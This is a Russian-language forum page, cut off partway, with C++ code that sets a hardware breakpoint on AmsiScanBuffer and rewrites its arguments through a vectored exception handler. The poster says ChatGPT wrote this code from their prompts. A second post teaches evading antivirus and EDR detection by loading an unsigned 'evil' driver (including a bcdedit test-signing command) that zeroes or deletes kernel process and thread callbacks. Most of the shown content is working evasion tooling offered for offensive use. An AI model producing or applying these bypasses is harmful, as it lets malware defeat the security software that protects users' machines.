	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>#include &lt;Windows.h&gt;
#include &lt;iostream&gt;

void SetHardwareBreakpoint(void* address)
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to get thread context.&quot; &lt;&lt; std::endl;
        return;
    }

    // Set the address into DR0 (debug register 0)
    context.Dr0 = (DWORD_PTR)address;
    context.Dr7 |= 0x00000001;  // Activate DR0 for execution

    if (!SetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to set thread context.&quot; &lt;&lt; std::endl;
    }
}

int main()
{
    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
    if (!hAmsi)
    {
        std::cerr &lt;&lt; &quot;Failed to load amsi.dll&quot; &lt;&lt; std::endl;
        return 1;
    }

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
    if (!pAmsiScanBuffer)
    {
        std::cerr &lt;&lt; &quot;Failed to find AmsiScanBuffer function.&quot; &lt;&lt; std::endl;
        return 1;
    }

    SetHardwareBreakpoint(pAmsiScanBuffer);

    // TODO: Add your code here.

    return 0;
}</code></pre>
	</div>
</div><br />
–≠—Ç–æ—Ç –∫–æ–¥ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ö–∞—Ä–¥–≤–µ—Ä–Ω—ã–π –±—Ä–µ–π–∫–ø–æ–∏–Ω—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer. –ö–æ–≥–¥–∞ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–∑–≤–∞–Ω–∞, –≤–∞—à–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø–æ–ø–∞–¥–µ—Ç –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∏—Å–∫–ª—é—á–µ–Ω–∏—è (EXCEPTION_SINGLE_STEP). –í—ã –º–æ–∂–µ—Ç–µ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —ç—Ç–æ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω—É–∂–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–∏ –±—Ä–µ–π–∫–ø–æ–∏–Ω—Ç–∞.<br />
<br />
–ß—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer, –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–µ–∫—Ç–æ—Ä–Ω—ã–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è Windows. –°–Ω–∞—á–∞–ª–∞ –¥–æ–±–∞–≤—å—Ç–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∏—Å–∫–ª—é—á–µ–Ω–∏–π, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –ø—Ä–∏ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–∏ –±—Ä–µ–π–∫–ø–æ–∏–Ω—Ç–∞, –∞ –∑–∞—Ç–µ–º –≤ —ç—Ç–æ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç–µ –≤—ã–∑–æ–≤ AmsiScanBuffer.<br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω –ø—Ä–∏–º–µ—Ä:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>#include &lt;Windows.h&gt;
#include &lt;iostream&gt;

LONG CALLBACK VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        // TODO: –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–∑–æ–≤–∞ AmsiScanBuffer
        // ...
     
        // –í–µ—Ä–Ω–∏—Ç–µ EXCEPTION_CONTINUE_EXECUTION, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // –ï—Å–ª–∏ —ç—Ç–æ –Ω–µ —Ç–∞ –æ—à–∏–±–∫–∞, –∫–æ—Ç–æ—Ä—É—é –º—ã –∏—Å–∫–∞–ª–∏, –≤–µ—Ä–Ω–∏—Ç–µ EXCEPTION_CONTINUE_SEARCH.
    return EXCEPTION_CONTINUE_SEARCH;
}

void SetHardwareBreakpoint(void* address)
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to get thread context.&quot; &lt;&lt; std::endl;
        return;
    }

    // Set the address into DR0 (debug register 0)
    context.Dr0 = (DWORD_PTR)address;
    context.Dr7 |= 0x00000001;  // Activate DR0 for execution

    if (!SetThreadContext(hThread, &amp;context))
    {
        std::cerr &lt;&lt; &quot;Failed to set thread context.&quot; &lt;&lt; std::endl;
    }
}

int main()
{
    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
    if (!hAmsi)
    {
        std::cerr &lt;&lt; &quot;Failed to load amsi.dll&quot; &lt;&lt; std::endl;
        return 1;
    }

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
    if (!pAmsiScanBuffer)
    {
        std::cerr &lt;&lt; &quot;Failed to find AmsiScanBuffer function.&quot; &lt;&lt; std::endl;
        return 1;
    }

    SetHardwareBreakpoint(pAmsiScanBuffer);

    // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤–µ–∫—Ç–æ—Ä–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∏—Å–∫–ª—é—á–µ–Ω–∏–π
    AddVectoredExceptionHandler(1, VectoredExceptionHandler);

    // TODO: Add your code here.

    return 0;
}</code></pre>
	</div>
</div><br />
–í VectoredExceptionHandler –≤—ã –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø—Ä–∏ –≤—ã–∑–æ–≤–µ AmsiScanBuffer. –ù–∞–ø—Ä–∏–º–µ—Ä, –≤—ã –º–æ–∂–µ—Ç–µ –∏–∑–º–µ–Ω–∏—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç—ã, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º—ã–µ –≤ —Ñ—É–Ω–∫—Ü–∏—é, –∏–ª–∏ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–ß—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer –≤ VectoredExceptionHandler, –Ω—É–∂–Ω–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–º –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –ø–µ—Ä–µ–¥–∞–Ω –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∏—Å–∫–ª—é—á–µ–Ω–∏–π. –ê—Ä–≥—É–º–µ–Ω—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è —á–µ—Ä–µ–∑ —Ä–µ–≥–∏—Å—Ç—Ä—ã –∏–ª–∏ —á–µ—Ä–µ–∑ —Å—Ç–µ–∫ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –∏ —Å–æ–≥–ª–∞—à–µ–Ω–∏—è –≤—ã–∑–æ–≤–∞. –í x64 Windows, –ø–µ—Ä–≤—ã–µ —á–µ—Ç—ã—Ä–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è —á–µ—Ä–µ–∑ —Ä–µ–≥–∏—Å—Ç—Ä—ã RCX, RDX, R8 –∏ R9, –∞ –æ—Å—Ç–∞–ª—å–Ω—ã–µ ‚Äî —á–µ—Ä–µ–∑ —Å—Ç–µ–∫.<br />
<br />
–í –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer:<br />
<ul>
<li data-xf-list-type="ul">RCX –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å amsiContext</li>
<li data-xf-list-type="ul">RDX –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ buffer</li>
<li data-xf-list-type="ul">R8 –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å length</li>
<li data-xf-list-type="ul">R9 –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å contentName</li>
</ul>–û—Å—Ç–∞–ª—å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —Å—Ç–µ–∫–∞.<br />
<br />
–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ç–æ–≥–æ, –∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –∏–∑–º–µ–Ω–∏—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="cpp"><code>LONG CALLBACK VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        CONTEXT* context = ExceptionInfo-&gt;ContextRecord;

        // –ò–∑–º–µ–Ω—è–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏
        context-&gt;Rcx = (DWORD_PTR)modifiedAmsiContext;
        context-&gt;Rdx = (DWORD_PTR)modifiedBuffer;
        context-&gt;R8 = modifiedLength;
        context-&gt;R9 = (DWORD_PTR)modifiedContentName;

        // –ï—Å–ª–∏ –Ω—É–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ —Å—Ç–µ–∫–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, amsiSession –∏–ª–∏ result):
        DWORD_PTR* stack = (DWORD_PTR*)context-&gt;Rsp;
        stack[0] = (DWORD_PTR)modifiedAmsiSession; // –ü–µ—Ä–≤—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç –≤ —Å—Ç–µ–∫–µ
        stack[1] = (DWORD_PTR)&amp;modifiedResult;     // –í—Ç–æ—Ä–æ–π –∞—Ä–≥—É–º–µ–Ω—Ç –≤ —Å—Ç–µ–∫–µ

        // ...

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}</code></pre>
	</div>
</div><br />
<b>–≠—Ç–æ —Å—Ç–∞—Ç—å—è –Ω–∞–ø–∏—Å–∞–Ω–∞ ChatGPT —Å –º–æ–∏–º–∏ –ø–æ–¥—Å–∫–∞–∑–∫–∞–º–∏ –∏ –Ω–∞–≤–æ–¥—è—â–∏–º–∏ –≤–æ–ø—Ä–æ—Å–∞–º–∏...)<br />
–ö—Ä—É—Ç–æ –ø—Ä–∞–≤–¥–∞ ?</b></div>
						

							<h2>–£–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–≥–æ –¥–µ—Ç–µ–∫—Ç–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ –∏ EDR</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746796964029.png"
		data-src="https://osint42.org/attachments/1746796964029-png.334/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796964029-png.334/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796964029.png"
			title="1746796964029.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!<br />
<br />
–î–∞–≤–∞–π—Ç–µ –ø–æ–∏—Å—Å–ª–µ–¥—É–µ–º –∫–∞–∫ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ –¥–µ—Ç–µ–∫—Ç —Å–≤—è–∑–∞–Ω–Ω—ã–π —Å –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:<br />
<br />
–í–æ–æ–±—â–µ —Ç—É—Ç —Å—É—â–µ—Å—Ç–≤—É—é—Ç –¥–≤–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞ –æ–±—Ö–æ–¥–∞:<br />
<br />
<b><u>1)–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–Ω—Ç–∏—Ö—É–∫–∏ –≤ —Å–≤–æ—ë–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏</u></b>, —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –ø—Ä–æ—Å—Ç–æ–π –∏ –æ–ø–∏—Å–∞–Ω —É–∂–µ –∑–¥–µ—Å—å:–û—Ç–∫—Ä—ã–≤–∞–µ–º –≤—Ä–∞—Ç–∞ –∞–¥–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
–ò–ª–∏ –≤–æ—Ç –µ—â—ë –ø—Ä–æ–µ–∫—Ç:–§—Ä–µ–π–º–≤–æ—Ä–∫ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤<br />
<br />
–ù–æ –¥–∞–Ω–Ω—ã–π –º–µ—Ç–æ–¥ –Ω–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç 100% –æ–±–æ–π—Ç–∏ –∑–∞—â–∏—Ç—É, —Ç.–∫. –º–Ω–æ–≥–∏–µ  AV –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∫–æ–ª–ª–±—ç–∫–∏ –∏ –º–∏–Ω–∏-—Ñ–∏–ª—å—Ç—Ä—ã —è–¥—Ä–∞.<br />
–¢—É—Ç –Ω—É–∂–µ–Ω –≤—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–±, –∞ –≤–æ–æ–±—â–µ –º–æ–∂–Ω–æ –≤ –∫–æ–º–ø–ª–µ–∫—Å–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å.)<br />
<br />
2)–ò—Ç–∞–∫ –≤—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–±:<br />
<br />
<b><u>–≠—Ç–æ—Ç —Å–ø–æ—Å–æ–± –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —É–¥–∞–ª–µ–Ω–∏–∏ –∫–∞–ª–±—ç–∫–æ–≤ –∑–∞—â–∏—Ç–Ω–æ–≥–æ —Ä–µ—à–µ–Ω–∏—è –≤ —è–¥—Ä–µ.)</u></b><br />
<br />
–î–æ–ª–≥–æ–µ –≤—Ä–µ–º—è Microsoft –ø—ã—Ç–∞–ª–∞—Å—å –ø–µ—Ä–µ–Ω–µ—Å—Ç–∏ –∏ –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –ª—é–±–æ–π —Å—Ç–æ—Ä–æ–Ω–Ω–∏–π –∫–æ–¥ ring0.<br />
–≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø–æ –ø–æ–Ω—è—Ç–Ω—ã–º –ø—Ä–∏—á–∏–Ω–∞–º, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —á—Ç–æ–±—ã –Ω–µ –ø–æ–∑–≤–æ–ª—è—Ç—å —Å—Ç–æ—Ä–æ–Ω–Ω–∏–º —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞–º –≤–º–µ—à–∏–≤–∞—Ç—å—Å—è –≤ –∫–æ–¥ —è–¥—Ä–∞ –∏ –∏–∑–±–µ–≥–∞—Ç—å –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è –∏–º –¥–æ—Å—Ç—É–ø–∞ –∫ –æ–±—Ö–æ–¥–∞–º –∑–∞—â–∏—Ç—ã —è–¥—Ä–∞ KPP (Kernel Patch Protection).<br />
<br />
–ò–∑-–∑–∞ —ç—Ç–æ–≥–æ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª–∏ EDR –≤—ã–Ω—É–∂–¥–µ–Ω—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–∏–µ —Å–ø–æ—Å–æ–±—ã –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å —è–¥—Ä–æ–º, –∞ –∏–º–µ–Ω–Ω–æ –∫–æ–ª–ª–±—ç–∫–∏ –∏ –º–∏–Ω–∏-—Ñ–∏–ª—å—Ç—Ä—ã.<br />
–¶–µ–ª—å –¥—Ä–∞–π–≤–µ—Ä–æ–≤ –º–∏–Ω–∏-—Ñ–∏–ª—å—Ç—Ä–æ–≤ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤–≤–æ–¥–∞/–≤—ã–≤–æ–¥–∞ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–∏ –∏–ª–∏ –∑–∞–º–µ–Ω–µ –Ω–∞—Ç–∏–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–µ–π.<br />
–ú–µ–∂–¥—É —Ç–µ–º, –∫–æ–ª–ª–±—ç–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤/–ø–æ—Ç–æ–∫–æ–≤ –∏ –∑–∞–≥—Ä—É–∑–∫–∏ –æ–±—Ä–∞–∑–æ–≤.<br />
<br />
<b>–ò—Ç–∞–∫ –º–æ–µ–º—É –º–Ω–µ–Ω–∏—é, –ª—É—á—à–∏–π —Å–ø–æ—Å–æ–± –∏–∑—É—á–∏—Ç—å —Ç–µ–º—É - —ç—Ç–æ –Ω–∞—á–∞—Ç—å —Å —Ç–µ–æ—Ä–∏–∏ –∏ –ø–µ—Ä–µ–π—Ç–∏ –∫ —á–µ–º—É-—Ç–æ –æ—Å—è–∑–∞–µ–º–æ–º—É</b><br />
<br />
–î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–µ, —á—Ç–æ –º–æ–∂–Ω–æ –¥–æ—Å—Ç–∏—á—å —Å –ø–æ–º–æ—â—å—é –∑–ª–æ–≤—Ä–µ–¥–Ω–æ–≥–æ –¥—Ä–∞–π–≤–µ—Ä–∞.<br />
<a href="https://github.com/uf0o/windows-ps-callbacks-experiments/tree/master/evil-driver" target="_blank" class="link link--external" rel="noopener">–ó–∞–≥—Ä—É–∑–∏—Ç–µ –∫–æ–ø–∏—é –ø—Ä–æ–µ–∫—Ç–∞ Visual Studio –∑–¥–µ—Å—å</a>, —Å–∫–æ–º–ø–∏–ª–∏—Ä—É–π—Ç–µ –µ–≥–æ –¥–ª—è x64, —Ä–µ–∂–∏–º –æ—Ç–ª–∞–¥–∫–∏.<br />
<br />
–†–µ–∂–∏–º –æ—Ç–ª–∞–¥–∫–∏ –≤–∫–ª—é—á–∏—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä—ã KdPrint –∏ –ø–æ–∑–≤–æ–ª–∏—Ç –Ω–∞–º –Ω–∞–±–ª—é–¥–∞—Ç—å –∑–∞ –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º –¥—Ä–∞–π–≤–µ—Ä–∞ —á–µ—Ä–µ–∑ (DebugView)[<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/debugview" target="_blank" class="link link--external" rel="noopener">DebugView - Sysinternals</a>] –æ—Ç SysInternals –∏–ª–∏ —á–µ—Ä–µ–∑ —É–¥–∞–ª–µ–Ω–Ω—É—é —Å–µ—Å—Å–∏—é —è–¥—Ä–∞ WinDbg.<br />
<br />
–£—Å–ø–µ—à–Ω–∞—è –∫–æ–º–ø–∏–ª—è—Ü–∏—è –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Å–æ–∑–¥–∞–Ω–∏—é –¥–≤—É—Ö –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤: –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ —Ä–µ–∂–∏–º–∞ evilcli.exe –∏ —Å–∞–º–æ–≥–æ –¥—Ä–∞–π–≤–µ—Ä–∞ evil.sys. –ü–æ—Å–∫–æ–ª—å–∫—É –Ω–∞—à –¥—Ä–∞–π–≤–µ—Ä –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω, –ø–µ—Ä–µ–¥ —É—Å—Ç–∞–Ω–æ–≤–∫–æ–π, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–∫–ª—é—á–∏—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–π —Ä–µ–∂–∏–º –∏–∑ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ —Å –ø–æ–º–æ—â—å—é Bcdedit.exe -set TESTSIGNING ON –∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –º–∞—à–∏–Ω—É.<br />
<b><u>–ü–æ–∑–∂–µ –º—ã —É–≤–∏–¥–∏–º, –∫–∞–∫ –¥–æ—Å—Ç–∞–≤–∏—Ç—å —Ç–æ—Ç –∂–µ —Å–∞–º—ã–π –¥—Ä–∞–π–≤–µ—Ä –≤ –Ω–æ—Ä–º–∞–ª—å–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏, –±–µ–∑ –≤–∫–ª—é—á–µ–Ω–∏—è —Ç–µ—Å—Ç–æ–≤–æ–≥–æ —Ä–µ–∂–∏–º–∞.</u></b><br />
<br />
CLI –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω —Å–ª–µ–¥—É—é—â–∏–º–∏ –æ–ø—Ü–∏—è–º–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\windows-ps-callbacks-experiments-master\evil-driver\x64\Debug&gt;evilcli.exe

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: evilcli.exe &lt;–æ–ø—Ü–∏–∏&gt;

–û–ø—Ü–∏–∏:

-h –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.
-l –°–ø–∏—Å–æ–∫ –∞–¥—Ä–µ—Å–æ–≤ –∫–æ–ª–ª–±—ç–∫–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö, –ø–æ—Ç–æ–∫–∞—Ö –∏ –∑–∞–≥—Ä—É–∑–∫–µ –æ–±—Ä–∞–∑–æ–≤.

&lt;–ö–æ–ª–ª–±—ç–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤&gt;

-zp –û–±–Ω—É–ª–∏—Ç—å –º–∞—Å—Å–∏–≤ –∫–æ–ª–ª–±—ç–∫–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö (–†–µ–∂–∏–º –∫–æ–≤–±–æ—è).
-dp &lt;–∏–Ω–¥–µ–∫—Å&gt; –£–¥–∞–ª–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–µ (–†–µ–∂–∏–º –∫—Ä–∞—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã).
-pp &lt;–∏–Ω–¥–µ–∫—Å&gt; –ò—Å–ø—Ä–∞–≤–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–µ (–†–µ–∂–∏–º —É–≥—Ä–æ–∑—ã –∞–∫—Ç–µ—Ä–∞).
-rp &lt;–∏–Ω–¥–µ–∫—Å&gt; –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–ª–ª–±—ç–∫—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø—Ä–æ—Ü–µ—Å—Å–µ (–†–µ–∂–∏–º –∑–∞–¥—É–º—á–∏–≤–æ–≥–æ –Ω–∏–Ω–¥–∑—è).

&lt;–ö–æ–ª–ª–±—ç–∫–∏ –ø–æ—Ç–æ–∫–æ–≤&gt;

-zt –û–±–Ω—É–ª–∏—Ç—å –º–∞—Å—Å–∏–≤ –∫–æ–ª–ª–±—ç–∫–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ –ø–æ—Ç–æ–∫–∞—Ö (–†–µ–∂–∏–º –∫–æ–≤–±–æ—è).
-dt &lt;–∏–Ω–¥–µ–∫—Å&gt; –£–¥–∞–ª–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ—Ç–æ–∫–µ (–†–µ–∂–∏–º –∫—Ä–∞—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã).
